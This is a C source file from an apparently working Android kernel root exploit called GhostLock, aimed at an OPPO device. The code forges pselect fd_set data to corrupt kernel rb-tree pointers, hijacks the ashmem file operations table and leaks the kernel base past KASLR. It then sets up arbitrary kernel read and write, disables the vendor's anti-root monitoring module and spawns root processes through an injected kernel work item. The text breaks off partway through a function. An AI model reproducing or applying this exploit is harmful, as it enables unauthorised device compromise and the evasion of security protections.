#include "common.h"

/* Default 24 retries is hostile when a single miss panics the device. */
#ifndef PSELECT_CFI_ROUTE_ATTEMPTS
/* a.so live: attempt=1..24 with cfi miss refresh */
#define PSELECT_CFI_ROUTE_ATTEMPTS 24
#endif

atomic_int cfi_stage_done;
uint64_t fops_before;
uint64_t fops_after;
int cfi_attempts;
int pipe_stage_attempts;
int cfi_dirty_seen;
int cfi_last_step;
int cfi_last_errno;
int kaslr_done;
int kaslr_step;
uint64_t kaslr_fops_alias;
uint64_t kaslr_open_ptr;
uint64_t kaslr_ioctl_ptr;
uint64_t kaslr_mmap_ptr;
uint64_t kaslr_release_ptr;
uint64_t kaslr_show_fdinfo_ptr;
uint64_t kaslr_base;
uint64_t kaslr_slide;
/* Raw pointer parsed from boot_id after GhostLock pselect writeback */
uint64_t boot_id_leaked_ptr;
int boot_id_leak_is_kimage;
int boot_id_leak_is_physmap;
int boot_id_leak_is_hybrid;
uint64_t slide_bootid_hi_capture;
uint64_t kaslr_expected_ioctl;
uint64_t kaslr_expected_mmap;
uint64_t kaslr_expected_release;
uint64_t kaslr_expected_show_fdinfo;
uint64_t slide_bootid_before;
uint64_t slide_bootid_after;
ssize_t slide_bootid_restore_ret = -1;

static int route_delay_usec(int attempt) {
  static const int delays[] = {
    0, 10000, 30000, 70000, 100000, 150000, 20000, 120000,
  };

  int count = (int)(sizeof(delays) / sizeof(delays[0]));
  return delays[(attempt - 1) % count];
}

void fdset_put_word(fd_set *set, int word, uint64_t value) {
  unsigned long *bits = (unsigned long *)set;
  bits[word] = (unsigned long)value;
}

uint64_t fdset_get_word(const fd_set *set, int word) {
  const unsigned long *bits = (const unsigned long *)set;
  return bits[word];
}

void open_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd) {
  /*
   * BUGFIX (device audit): MUST bind selected fds to a blocking
   * read-end / timerfd, NOT the pipe write-end. Write-end is always ready
   * → pselect returns immediately → consumer walks after stack is gone →
   * PANIC_ON_OOPS. JoinChang uses read_fd for all selected bits.
   */
  (void)write_fd;
  int high_read = fcntl(read_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
  if (high_read < 0) {
    pr_warning("pselect F_DUPFD read errno=%d\n", errno);
    return;
  }
  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(high_read, fd);
    }
  }
  close(high_read);
  dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
  FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
}

/* Place waiter qword at global word index across in/out/ex (JoinChang). */
static int pselect_words_per_set(void) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (PSELECT_ROUTE_NFDS + bits_per_word - 1) / bits_per_word;
}

static void pselect_put_global_word(fd_set *in, fd_set *out, fd_set *ex,
                                    int words_per_set, int global_word,
                                    uint64_t value) {
  if (global_word < 0) {
    return;
  }
  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      break;
    case 1:
      fdset_put_word(out, word_idx, value);
      break;
    case 2:
      fdset_put_word(ex, word_idx, value);
      break;
    default:
      break;
  }
}

void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  /*
   * words_per_set=5 (NFDS=320): tree=in[0..4], pi=out[0..4],
   * task=ex[0], lock=ex[1], wake=ex[2]. PKJ110 stages-ok proved this map.
   *
   * JoinChang parent-store (NOT Nebula lock=target-8):
   *   rb_node: parent@0, right@8, left@16
   *   __rb_change_child: if (parent->left==node) write left; else write right
   *   parent = target-8 → right at *target, left at target+8
   *   *selinux_state==1 ≠ stack node → left!=node → WRITE *target = child
   *   lock = page fake_lock only — Nebula lock=target-8 overlays owner on
   *   selinux status page at +16 → wake_up_state panic (root-run-8/18).
   *
   * Classic FOPS: in[0]=fake_w0, lock=fake_lock.
   */
  if (pselect_custom_write_enabled()) {
    /*
     * Device fact: SIMPLE in0=fake_w0 never overwrites boot_id (proven
     * in earlier diagnostics). Proven write path is classic slide stack
     * layout: full waiter on pselect fdset words (not a pointer to
     * sprayed page waiter).
     *
     * Left-write (mode=1): *left = parent|color
     *   parent = page_base (4K-aligned → low byte 0 if color RED)
     *   left   = pselect_custom_target (misc.fops / boot_id)
     * Do NOT put target-8 on stack as lock (reboots via notif_lock).
     */
    int words_per_set = pselect_words_per_set();
    /*
     * left-write *target = tree_pc|color.
     * store_value=0 means "use page_base" (FOPS_PI_ONLY default). A
     * non-zero pselect_custom_value is an explicit parent (fake_fops for
     * the live *ashmem_misc.fops hijack).
     */
    uint64_t tree_pc = pselect_custom_value ? (uint64_t)pselect_custom_value
                                            : (uint64_t)page_base;
    uint64_t tree_right = 0;
    uint64_t tree_left = (uint64_t)pselect_custom_target;
    struct {
      int word;
      uint64_t value;
    } words[] = {
      {0, tree_pc},
      {1, tree_right},
      {2, tree_left},
      {3, FAKE_WAITER_PRIO},
      {4, 0},
      {5, tree_pc},
      {6, tree_right},
      {7, tree_left},
      {8, FAKE_WAITER_PRIO},
      {9, 0},
      /* a.so uses init_task (real task_struct) here, NOT a sprayed page:
       * pselect return path derefs waiter->task; fake_task (heap page)
       * panics ~50% on PKJ110. text_addr(INIT_TASK) matches a.so
       * do_pselect_fake_lock_route: ex[0] = text_addr(profile->0xe8). */
      {10, (uint64_t)text_addr(INIT_TASK)},
      {11, (uint64_t)fake_lock},
      {12, 3},
      {13, 0},
    };
    for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
      pselect_put_global_word(in, out, ex, words_per_set, words[i].word,
                              words[i].value);
    }
    pr_info("pselect custom stack mode=%d tree_pc=%016llx left=%016llx "
            "right=%016llx lock=%016zx task=%016zx\n",
            pselect_custom_write, (unsigned long long)tree_pc,
            (unsigned long long)tree_left, (unsigned long long)tree_right,
            fake_lock, fake_task);
    return;
  }

  /* Unreachable in the current chain: every do_pselect entry arms the
   * custom write first (classic in0=fake_w0 stack never overwrote
   * boot_id on this device — kept only as a compile-checked fallback). */
  fdset_put_word(in, 0, (uint64_t)fake_w0);
  fdset_put_word(in, 1, 0);
  fdset_put_word(in, 2, 0);
  fdset_put_word(in, 3, 0);
  /* a.so: ex[0]=init_task (real task), ex[1]=fake_lock. */
  fdset_put_word(ex, 0, (uint64_t)text_addr(INIT_TASK));
  fdset_put_word(ex, 1, (uint64_t)fake_lock);
  fdset_put_word(ex, 2, 3);
  fdset_put_word(ex, 3, 0);
}

void do_pselect_fake_lock_route(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    cfi_last_step = 30;
    cfi_last_errno = 0;
    pr_error("pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return;
  }

  int calls = 0;
  int success = 0;
  int route_verified = 0;
  int custom = pselect_custom_write_enabled();
  int max_attempts = custom ? 1 : PSELECT_CFI_ROUTE_ATTEMPTS;
  {
    char *ma = getenv("GHOSTLOCK_FOPS_MAX_ATTEMPTS");
    if (ma && ma[0]) {
      int v = (int)strtoul(ma, NULL, 0);
      if (v >= 1 && v <= 24) {
        max_attempts = v;
      }
    }
  }
  int skip_cfi = 0;
  {
    char *sc = getenv("GHOSTLOCK_FOPS_SKIP_CFI");
    skip_cfi = sc && sc[0] == '1';
    if (skip_cfi) {
      pr_info("FOPS_SKIP_CFI=1: PI route only (no try_cfi_stage / no ashmem call)\n");
    }
  }

  for (int route_attempt = 1; route_attempt <= max_attempts; route_attempt++) {
    if (route_attempt != 1) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      if (!page_base || !fake_lock || !fake_fops) {
        cfi_last_step = 34;
        cfi_last_errno = errno;
        pr_error("pselect retry page prepare failed attempt=%d base=%016zx "
                 "lock=%016zx fops=%016zx\n",
                 route_attempt, page_base, fake_lock, fake_fops);
        break;
      }
    }

    int pipefd[2];
    SYSCHK(pipe(pipefd));
    /*
     * JoinChang: timerfd for custom-write (never-ready, blocks select);
     * pipe read-end for classic FOPS path.
     */
    int block_fd = pipefd[0];
    int own_block = 0;
    if (custom) {
      int tfd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
      if (tfd >= 0) {
        block_fd = tfd;
        own_block = 1;
      } else {
        pr_warning("timerfd_create errno=%d; using pipe read\n", errno);
      }
    }
    int high_read = fcntl(block_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 16);
    if (high_read < 0) {
      cfi_last_step = 31;
      cfi_last_errno = errno;
      pr_error("pselect F_DUPFD read errno=%d\n", errno);
      if (own_block) {
        close(block_fd);
      }
      close(pipefd[0]);
      close(pipefd[1]);
      break;
    }

    fd_set in;
    fd_set out;
    fd_set ex;
    prepare_pselect_fdsets(&in, &out, &ex);
    open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);
    pr_info("pselect route setup custom=%d page=%016zx page_lock=%016zx "
            "stack_lock=%016zx w0=%016zx task=%016zx parent=%016zx right=%016zx "
            "kaslr_done=%d kaslr_base=%016zx\n",
            custom, page_base, fake_lock,
            fake_lock, fake_w0, fake_task, fake_parent,
            fake_right, kaslr_done, kaslr_base);
    if (!custom) {
      pr_info("pselect FOPS text handlers read_iter=%016zx write_iter=%016zx "
              "open=%016zx\n",
              text_addr(CONFIGFS_READ_ITER), text_addr(CONFIGFS_BIN_WRITE_ITER),
              text_addr(ASHMEM_OPEN));
    }
    if (custom) {
      pr_info("pselect custom mode=%d in0=%s target=%016zx lock=%016zx "
              "right=%016zx\n",
              pselect_custom_write,
              pselect_custom_write == 1 ? "tree_fields" : "fake_w0",
              pselect_custom_target, fake_lock, fake_right);
    }
    fsync(STDERR_FILENO);

    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
    /*
     * Timing (facts):
     * - root-run-6: custom delay=0 + PI success=1, ALIVE (enforce still 1).
     * - root-run-25: custom delay=50000 → REBOOT during pselect (worse).
     * - a.so main FOPS path uses 50ms; a.so SELinux is pipe_phys direct
     *   write after physrw, NOT JoinChang constrained write (string:
     *   "root selinux direct write ok=%d").
     * Keep custom delay=0 for survival (live: delay=50000 + custom reboots
      * during pselect ENTER). Env PSELECT_ROUTE_DELAY_USEC applies only to
      * non-custom routes; custom ignores it unless GHOSTLOCK_CUSTOM_DELAY=1.
      */
    int delay_usec = custom ? 0 : route_delay_usec(route_attempt);
    {
      char *envd = getenv("PSELECT_ROUTE_DELAY_USEC");
      char *force_custom = getenv("GHOSTLOCK_CUSTOM_DELAY");
      int allow_env = !custom || (force_custom && force_custom[0] == '1');
      if (allow_env && envd && envd[0]) {
        delay_usec = (int)strtoul(envd, NULL, 0);
      }
    }
    atomic_store(&main_route_delay_usec, delay_usec);
    pr_info("pselect ENTER attempt=%d delay_usec=%d skip_cfi=%d custom=%d\n",
            route_attempt, delay_usec, skip_cfi, custom);
    fsync(STDERR_FILENO);
    atomic_store(&punch_consume_go, route_attempt);

    errno = 0;
    int ret;
    int saved_errno;
    {
      struct timespec timeout = {
          .tv_sec = PSELECT_TIMEOUT_SEC,
          .tv_nsec = 0,
      };
      ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout, NULL);
      saved_errno = errno;
    }
    atomic_store(&punch_consume_go, 0);
    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);
    pr_info("pselect RETURN attempt=%d ret=%d errno=%d calls=%d success=%d "
            "delay=%d custom=%d\n",
            route_attempt, ret, saved_errno, calls, success, delay_usec, custom);
    fsync(STDERR_FILENO);

    int route_signal = calls > 0 && success > 0;
    if (route_signal) {
      /* Custom data write: PI walk is the payload; no FOPS/configfs. */
      if (pselect_custom_write_enabled()) {
        cfi_last_step = 0;
        cfi_last_errno = 0;
        route_verified = 1;
        pr_info("pselect custom-write route ok attempt=%d calls=%d success=%d\n",
                   route_attempt, calls, success);
      } else if (skip_cfi) {
        cfi_last_step = 0;
        cfi_last_errno = 0;
        route_verified = 1;
        pr_info("pselect FOPS PI route ok (SKIP_CFI) attempt=%d calls=%d "
                   "success=%d — hijack window survived; CFI not attempted\n",
                   route_attempt, calls, success);
      } else if (try_cfi_stage()) {
        cfi_last_step = 0;
        route_verified = 1;
      } else if (!cfi_last_step) {
        cfi_last_step = 32;
      }
    } else if (!route_verified) {
      cfi_last_step = 33;
      cfi_last_errno = saved_errno;
    }

    close(high_read);
    if (own_block) {
      close(block_fd);
    }
    close(pipefd[0]);
    close(pipefd[1]);

    if (route_verified || cfi_dirty_seen) {
      break;
    }
    /*
     * route_signal == 0 (pselect returned without consumer write — run75
     * style miss): refresh the FOPS payload page and retry instead of
     * giving up. The next loop iteration re-prepares the page, so also
     * re-arm the custom write mode against the NEW fake_fops value.
     */
    if (!route_signal) {
      pr_info("pselect route miss attempt=%d/%d ret=%d errno=%d calls=%d "
              "success=%d; refreshing FOPS page\n",
              route_attempt, max_attempts, ret, saved_errno, calls, success);
      fsync(STDERR_FILENO);
      if (custom) {
        set_pselect_write_mode(data_addr(ASHMEM_MISC_FOPS), fake_fops, 1);
      }
      continue;
    }
    pr_info("pselect cfi miss attempt=%d/%d step=%d errno=%d; refreshing FOPS page\n",
            route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, cfi_last_step,
            cfi_last_errno);
  }
  pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
          calls, success, cfi_last_step, cfi_last_errno);
}

int repair_fake_fops_llseek(int fd) {
  uint64_t llseek = text_addr(NOOP_LLSEEK);
  uint64_t after = 0;
  uintptr_t slot = fake_fops + FOPS_LLSEEK_OFF;
  ssize_t wr = configfs_write_once(fd, slot, &llseek, sizeof(llseek));
  ssize_t rd = configfs_read_once(fd, slot, &after, sizeof(after));
  return wr == (ssize_t)sizeof(llseek) &&
         rd == (ssize_t)sizeof(after) &&
         after == llseek;
}

int refresh_fake_fops_text(int fd) {
  struct fops_slot {
    size_t off;
    uint64_t value;
  } slots[] = {
    {FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER)},
    {FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER)},
    {FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL)},
    {FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL)},
    {FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP)},
    {FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN)},
    {FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE)},
    {FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ)},
    {FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO)},
  };

  for (size_t i = 0; i < sizeof(slots) / sizeof(slots[0]); i++) {
    uintptr_t target = fake_fops + slots[i].off;
    if (kernel_write_data(fd, target, &slots[i].value,
        sizeof(slots[i].value)) !=
        (ssize_t)sizeof(slots[i].value)) {
      return 0;
    }
  }
  return 1;
}

int leak_kernel_base(int fd) {
  kaslr_fops_alias = p0_data_alias(ASHMEM_FOPS);
  kaslr_open_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_OPEN_OFF);
  kaslr_ioctl_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_IOCTL_OFF);
  kaslr_mmap_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_MMAP_OFF);
  kaslr_release_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_RELEASE_OFF);
  kaslr_show_fdinfo_ptr =
    kernel_read64(fd, kaslr_fops_alias + FOPS_SHOW_FDINFO_OFF);
  /* OPPO uses show@0xd0; some trees use 0xd8 — probe alt if primary is 0. */
  if (!kaslr_show_fdinfo_ptr) {
    uint64_t alt =
        kernel_read64(fd, kaslr_fops_alias + 0xd8);
    if (is_kernel_ptr(alt)) {
      pr_info("leak_kb show@0xd0=0; using show@0xd8=%016llx\n",
              (unsigned long long)alt);
      kaslr_show_fdinfo_ptr = alt;
    }
  }

  pr_info("leak_kb open=%016llx ioctl=%016llx mmap=%016llx release=%016llx "
          "show=%016llx alias=%016zx\n",
          (unsigned long long)kaslr_open_ptr,
          (unsigned long long)kaslr_ioctl_ptr,
          (unsigned long long)kaslr_mmap_ptr,
          (unsigned long long)kaslr_release_ptr,
          (unsigned long long)kaslr_show_fdinfo_ptr, kaslr_fops_alias);

  /*
   * Core slots must be kernel text. show_fdinfo may be NULL on some builds
   * (PKJ110 live: open/ioctl/mmap/release valid, show=0).
   */
  if (!is_kernel_ptr(kaslr_open_ptr) || !is_kernel_ptr(kaslr_ioctl_ptr) ||
      !is_kernel_ptr(kaslr_mmap_ptr) || !is_kernel_ptr(kaslr_release_ptr)) {
    kaslr_step = 1;
    pr_warning("leak_kb step=1 non-kernel ptrs\n");
    return 0;
  }
  if (kaslr_show_fdinfo_ptr && !is_kernel_ptr(kaslr_show_fdinfo_ptr)) {
    kaslr_step = 1;
    pr_warning("leak_kb step=1 show_fdinfo bad ptr\n");
    return 0;
  }

  /* True base from fops OPEN slot (overrides FORCE/perf guess). */
  {
    uint64_t base_from_open =
        kaslr_open_ptr - (ASHMEM_OPEN - KIMAGE_TEXT_BASE);
    kaslr_base = base_from_open;
    kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
    kaslr_done = 1;
  }
  kaslr_expected_ioctl = text_addr(ASHMEM_IOCTL);
  kaslr_expected_mmap = text_addr(ASHMEM_MMAP);
  kaslr_expected_release = text_addr(ASHMEM_RELEASE);
  kaslr_expected_show_fdinfo = text_addr(ASHMEM_SHOW_FDINFO);

  {
    int abs_ok =
        (kaslr_ioctl_ptr == kaslr_expected_ioctl &&
         kaslr_mmap_ptr == kaslr_expected_mmap &&
         kaslr_release_ptr == kaslr_expected_release &&
         (!kaslr_show_fdinfo_ptr ||
          kaslr_show_fdinfo_ptr == kaslr_expected_show_fdinfo));
    if (!abs_ok) {
      int64_t d_io = (int64_t)(kaslr_ioctl_ptr - kaslr_open_ptr);
      int64_t d_mm = (int64_t)(kaslr_mmap_ptr - kaslr_open_ptr);
      int64_t d_re = (int64_t)(kaslr_release_ptr - kaslr_open_ptr);
      int64_t e_io = (int64_t)(ASHMEM_IOCTL - ASHMEM_OPEN);
      int64_t e_mm = (int64_t)(ASHMEM_MMAP - ASHMEM_OPEN);
      int64_t e_re = (int64_t)(ASHMEM_RELEASE - ASHMEM_OPEN);
      pr_warning("leak_kb step=2 abs mismatch open_base=%016zx "
                 "d_io=%lld want=%lld d_mm=%lld want=%lld d_re=%lld want=%lld\n",
                 kaslr_base, (long long)d_io, (long long)e_io, (long long)d_mm,
                 (long long)e_mm, (long long)d_re, (long long)e_re);
      if (d_io == e_io && d_mm == e_mm && d_re == e_re) {
        pr_info("leak_kb soft-OK via open_ptr+delta (base=%016zx)\n",
                   kaslr_base);
      } else {
        kaslr_done = 0;
        kaslr_step = 2;
        return 0;
      }
    }
  }

  if (!refresh_fake_fops_text(fd)) {
    kaslr_done = 0;
    kaslr_step = 3;
    pr_warning("leak_kb step=3 refresh_fake_fops_text failed\n");
    return 0;
  }

  kaslr_step = 0;
  pr_info("leak_kb OK base=%016zx slide=%016zx\n", kaslr_base, kaslr_slide);
  return 1;
}

static int hexnib(int c) {
  if (c >= '0' && c <= '9') return c - '0';
  if (c >= 'a' && c <= 'f') return c - 'a' + 10;
  if (c >= 'A' && c <= 'F') return c - 'A' + 10;
  return -1;
}

/* parse "xxxxxxxx-xxxx-..." into 16 bytes; returns 0 on success */
static int parse_uuid_view(const char *v, unsigned char *out) {
  int n = 0;
  for (const char *p = v; *p && n < 32; p++) {
    if (*p == '-') continue;
    int hi = hexnib(p[0]);
    int lo = p[1] ? hexnib(p[1]) : -1;
    if (hi < 0 || lo < 0) return -1;
    out[n / 2] = (unsigned char)((hi << 4) | lo);
    n += 2;
    p++;
  }
  return n == 32 ? 0 : -1;
}

int restore_slide_boot_id(int fd) {
  /* The slide writeback changes the boot-id bytes before the rest of the
   * chain runs.  Restore the pre-leak UUID through the already-open fake-fops
   * fd, without dereferencing sysctl table pointers or scanning vmalloc/slab.
   * A failed repair remains non-blocking so the root path is preserved. */
  char view[64] = {0};
  int vf = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  int view_errno = 0;
  if (vf >= 0) {
    ssize_t vn = read(vf, view, sizeof(view) - 1);
    view_errno = errno;
    close(vf);
    view[vn > 0 ? vn : 0] = '\0';
  } else {
    view_errno = errno;
  }
  int view_valid = view[0] != '\0' && strlen(view) >= 36 && view[14] == '4' &&
                   (view[19] == '8' || view[19] == '9' || view[19] == 'a' ||
                    view[19] == 'b' || view[19] == 'A' || view[19] == 'B');
  if (view_valid) {
    pr_success("【boot_id修复】boot_id 本就完好 [%s]（无需修复）\n", view);
    slide_bootid_restore_ret = 16;
    return 1;
  }
  unsigned char cur[16];
  int have_cur = parse_uuid_view(view, cur) == 0;
  pr_info("slide boot_id polluted view=[%s] have_cur=%d verrno=%d\n", view,
          have_cur, view_errno);

  unsigned char uu[16];
  int have_snapshot = slide_true_bootid_len >= 36 &&
                      parse_uuid_view(slide_true_bootid, uu) == 0;
  if (have_snapshot) {
    pr_info("slide boot_id repair using pre-leak snapshot [%s]\n",
            slide_true_bootid);
  } else {
    pr_warning("slide boot_id repair: no valid pre-leak snapshot; "
               "/proc equality check will use UUID-shape only\n");
  }

  int fixed = 0;

  /* run188/186/187 live-evidence repair (NO scanning — run188 proved a
   * .data window scan panics the device after ~367 configfs reads).
   *
   * Damage model (fully self-consistent with every captured read):
   *   slide_parent = loggers[1] slot (kimage+0x2102698, SLIDE_LOGGERS_0_1)
   *   slide_left   = random_table+0x108 (kimage+0x22294e8) — the slot whose
   *                  value /proc boot_id renders through (the leak channel:
   *                  rendering the loggers array leaks loggers[0]=nfulnl).
   * GhostLock writes:
   *   1) *(0x22294e8) = slide_parent   → /proc renders the loggers array
   *   2) *(0x2102698) = slide_left     → nfnetlink loggers[1] now points
   *      into the sysctl table — EVERY newly-forked process that touches
   *      nfnetlink walks a wrong-type pointer (this is the app-kill root
   *      cause; old processes never re-read the table, hence they live).
   * Repair (two exact 8-byte writes, values from the ksyms dump):
   *   1) kimage+0x22294e8 ← &sysctl_bootid (kimage+0x236a0d8; run188 proved
   *      that static buffer still holds the TRUE pre-leak UUID)  → /proc
   *      renders the true boot UUID again.
   *   2) kimage+0x2102698 ← 0 (loggers[1] = NULL, the registered-logger
   *      free state; NULL is handled safely by nfnetlink lookups). */
  if (kaslr_done) {
    const uintptr_t render_slot = kaslr_base + SLIDE_BOOTID_DATA_OFF;
    const uintptr_t sysctl_bootid = kaslr_base + SLIDE_SYSCTL_BOOTID_OFF;
    const uintptr_t loggers1 = kaslr_base + SLIDE_LOGGERS_0_1_OFF;

    uint64_t cur_render = 0;
    uint64_t cur_l1 = 0;
    configfs_read_once(fd, render_slot, &cur_render, 8);
    configfs_read_once(fd, loggers1, &cur_l1, 8);
    pr_info("slide boot_id repair pre: render_slot=%016zx val=%016llx "
            "(want loggers1 ptr); loggers1 val=%016llx\n",
            (size_t)render_slot, (unsigned long long)cur_render,
            (unsigned long long)cur_l1);

    /* Repair 2 first: loggers[1] ← 0 (stop nfnetlink from walking the
     * bogus table pointer before anything else runs). */
    uint64_t zero = 0;
    ssize_t w2 = configfs_write_once(fd, loggers1, &zero, 8);
    uint64_t chk2 = 1;
    configfs_read_once(fd, loggers1, &chk2, 8);
    pr_info("slide boot_id repair loggers1 zero w=%zd now=%016llx\n", w2,
            (unsigned long long)chk2);
    if (w2 == 8 && chk2 == 0) {
      fixed++;
    }

    /* Repair 1: render slot ← &sysctl_bootid (true UUID buffer). */
    uint64_t want_ptr = (uint64_t)sysctl_bootid;
    ssize_t w1 = configfs_write_once(fd, render_slot, &want_ptr, 8);
    uint64_t chk1 = 0;
    configfs_read_once(fd, render_slot, &chk1, 8);
    pr_info("slide boot_id repair render_slot w=%zd now=%016llx "
            "want=%016llx\n",
            w1, (unsigned long long)chk1, (unsigned long long)want_ptr);
    if (w1 == 8 && chk1 == want_ptr) {
      fixed++;
      memcpy(&slide_bootid_before, cur, 8);
      memcpy(&slide_bootid_after, &chk1, 8);
      slide_bootid_restore_ret = (int)w1;
    }
  }
  pr_info("slide boot_id direct fixed=%d\n", fixed);

  /* authoritative /proc re-check: after repair 1, /proc must render the
   * TRUE pre-leak UUID (the static sysctl_bootid buffer kept it). */
  char view2[64] = {0};
  int vf2 = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (vf2 >= 0) {
    ssize_t vn = read(vf2, view2, sizeof(view2) - 1);
    close(vf2);
    view2[vn > 0 ? vn : 0] = '\0';
  }
  int final_ok = 0;
  if (have_snapshot) {
    /* view2 must equal the snapshotted true UUID */
    final_ok = strncmp(view2, slide_true_bootid, 36) == 0;
  } else {
    final_ok = view2[0] != '\0' && strlen(view2) >= 36 &&
               view2[14] == '4' &&
               (view2[19] == '8' || view2[19] == '9' || view2[19] == 'a' ||
                view2[19] == 'b' || view2[19] == 'A' || view2[19] == 'B');
  }
  if ((view_errno == EACCES || view_errno == EPERM) && view2[0] == '\0') {
    final_ok = fixed > 0;
  }
  pr_success("【boot_id修复】fixed=%d final=%d\n", fixed, final_ok);
  return fixed >= 2 && final_ok;
}

int install_child_root(int fd) {
  /*
   * pipe_physrw is REQUIRED: configfs arb-RW (via copy_to_iter) triggers
   * HARDENED_USERCOPY / KASAN_HW_TAGS panic on slab objects (task_struct,
   * cred). pipe_physrw goes through splice/page_cache, bypassing that check.
   */
  pr_success("【5/7 pipe物理读写】开始\n");
  fsync(STDERR_FILENO);
  int pipe_ok = install_pipe_physrw(fd);
  fsync(STDERR_FILENO);
  if (!pipe_ok) {
    pr_error("【失败 5/7 pipe物理读写】安装失败\n");
    return 0;
  }
  pr_success("【5/7 pipe物理读写】成功\n");
  /* Neutralize the OPPO oplus_secure_guard_new anti-root module FIRST:
   * it hooks execveat + set*uid/gid via kprobes and kills suspicious
   * processes (the KSU daemon re-exec, newly spawned root apps) and
   * reports to qsguard. Zero its kprobe/kretprobe handler pointers so
   * every hook becomes a no-op — before the UMH spawns anything. */
  {
    char *nosg = getenv("GHOSTLOCK_NO_SECUREGUARD");
    if (!(nosg && nosg[0] == '1')) {
      pr_success("【6/7 secureguard中和】开始\n");
      fsync(STDERR_FILENO);
      int sg_ok = neutralize_secureguard(fd);
      if (sg_ok) {
        pr_success("【6/7 secureguard中和】成功\n");
      } else {
        pr_warning("【6/7 secureguard中和】失败 zeroed=0\n");
      }
      fsync(STDERR_FILENO);
    }
  }
  /* UMH root FIRST (JoinChang ghostlock parity): inject a fake
   * work_struct into system_unbound_wq — the kernel forks our script
   * with ROOT creds. No credential patching, no setuid/setenforce
   * syscall → the ColorOS anti-root hook never sets the tamper tag
   * (no watchdog reboot, no newly-spawned-app kills). Fall back to the
   * cred-patch path only if UMH fails. GHOSTLOCK_NO_UMH=1 forces the
   * old path. */
  {
    char *noumh = getenv("GHOSTLOCK_NO_UMH");
    if (!(noumh && noumh[0] == '1') && install_umh_root(fd)) {
      umh_root_done = 1;
      pr_success("【7/7 获取ROOT】成功\n");
      fsync(STDERR_FILENO);
      /* Swordfish mitigation must land before ANY app launch: fork the
       * detached shell-context watcher that retries su -c setprop until
       * both props verify 0 (status → ghostlock_swordfish.txt). */
      fork_swordfish_watcher();
      return 1;
    }
    if (noumh && noumh[0] == '1') {
      pr_warning("【7/7 获取ROOT】跳过，改用备用方式\n");
    } else {
      pr_error("【失败 7/7 获取ROOT】注入失败，回退 cred patch\n");
    }
    fsync(STDERR_FILENO);
  }
  return install_android_root(fd);
}

int try_cfi_stage(void) {
  cfi_attempts++;
  /* Granular crash localization (run127-132: panic between RETURN and
   * "cfi pre_rb" with SKIP_CFI alive). fsync each step: panic discards
   * buffered stderr. */
  pr_success("【4/7 CFI验证】开始\n");
  fsync(STDERR_FILENO);
  int fd = open_ashmem_device();
  pr_info("cfi step1: open ret=%d errno=%d\n", fd, fd < 0 ? errno : 0);
  fsync(STDERR_FILENO);
  int dirty = 0;
  int can_read_back = 0;

  if (fd < 0) {
    cfi_last_step = 11;
    cfi_last_errno = errno;
    return 0;
  }

  uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
  uint64_t pre_fops = 0;
  pr_info("cfi step2: pread misc_fops=%016zx len=8\n", (size_t)misc_fops);
  fsync(STDERR_FILENO);
  ssize_t pre_rb = configfs_read_once(
      fd, misc_fops, &pre_fops, sizeof(pre_fops));
  pr_info("cfi pre_rb=%zd pre_fops=%016llx want_fake=%016zx misc_p0=%016zx "
          "parent=%016zx right=%016zx\n",
          pre_rb, (unsigned long long)pre_fops, fake_fops, misc_fops,
          fake_parent, fake_right);
  if (pre_rb != (ssize_t)sizeof(pre_fops) || pre_fops != fake_fops) {
    fops_before = pre_fops;
    cfi_last_step = 4;
    cfi_last_errno = errno;
    goto fail;
  }

  char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
  ssize_t n =
    configfs_write_once(fd, binwrite_target, payload, sizeof(payload));
  pr_info("cfi write ret=%zd errno=%d\n", n, errno);
  if (n != (ssize_t)sizeof(payload)) {
    cfi_last_step = 1;
    cfi_last_errno = errno;
    goto fail;
  }
  dirty = 1;
  cfi_dirty_seen = 1;

  if (!repair_fake_fops_llseek(fd)) {
    cfi_last_step = 2;
    cfi_last_errno = errno;
    goto fail;
  }
  can_read_back = 1;

  char readback[sizeof(payload)];
  memset(readback, 0, sizeof(readback));
  ssize_t r =
